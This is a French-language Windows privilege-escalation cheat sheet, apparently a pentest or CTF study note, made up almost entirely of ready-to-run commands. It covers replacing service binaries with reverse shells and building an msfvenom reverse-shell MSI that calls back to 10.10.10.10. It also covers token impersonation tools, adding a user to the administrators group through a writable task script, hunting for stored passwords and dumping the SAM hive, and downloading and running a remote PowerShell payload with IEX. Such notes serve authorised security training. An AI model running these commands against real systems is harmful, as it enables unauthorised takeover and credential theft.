# 04 — Privesc Windows

---

## Premiers réflexes après connexion

```cmd
whoami
whoami /priv
whoami /groups
systeminfo
hostname
net users
net localgroup administrators
```

---

## Services mal configurés

```cmd
# Lister les services
sc query
wmic service list brief

# Vérifier les permissions d'un service
sc qc nom_service
accesschk.exe -ucqv nom_service

# Si le binaire du service est writable
# Remplacer par un reverse shell
copy shell.exe "C:\Program Files\VulnService\service.exe"
sc stop nom_service
sc start nom_service
```

---

## AlwaysInstallElevated

```cmd
# Vérifier si activé
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Si les deux retournent 0x1 → exploitable
# Générer un .msi malveillant
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

---

## Token Impersonation

```cmd
# Vérifier les privilèges
whoami /priv

# Si SeImpersonatePrivilege → PrintSpoofer ou GodPotato
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"

# Si SeDebugPrivilege → accès aux process SYSTEM
```

---

## Unquoted Service Path

```cmd
# Chercher les services avec chemin non quoté
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\"

# Exemple vulnérable :
# C:\Program Files\My Service\service.exe
# → placer un exe à : C:\Program.exe ou C:\Program Files\My.exe
```

---

## Scheduled Tasks

```cmd
# Lister les tâches planifiées
schtasks /query /fo LIST /v

# Si un script est writable
echo net localgroup administrators user /add >> C:\scripts\task.bat
```

---

## Fichiers sensibles

```cmd
# Mots de passe dans les fichiers config
findstr /si password *.xml *.ini *.txt *.config
dir /s *pass* *cred* *vnc* *.config 2>nul

# Registre — credentials stockés
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Fichiers SAM (nécessite SYSTEM)
reg save HKLM\SAM sam.bak
reg save HKLM\SYSTEM system.bak
```

---

## PowerShell utile

```powershell
# Voir les droits sur un fichier/dossier
Get-Acl "C:\Program Files\VulnApp" | Format-List

# Lister les services avec chemin
Get-WmiObject win32_service | Select-Object Name, PathName, StartMode

# Télécharger un fichier
Invoke-WebRequest -Uri http://10.10.10.10/shell.exe -OutFile C:\Temp\shell.exe

# Exécuter un script depuis le web
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/payload.ps1')

# Bypass ExecutionPolicy
powershell -ExecutionPolicy Bypass -File script.ps1
```

---

## Outils automatiques

```cmd
# WinPEAS
winpeas.exe > output.txt

# PowerUp (PowerSploit)
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Seatbelt
Seatbelt.exe -group=all
```

> **Référence :** https://lolbas-project.github.io (équivalent GTFOBins pour Windows)
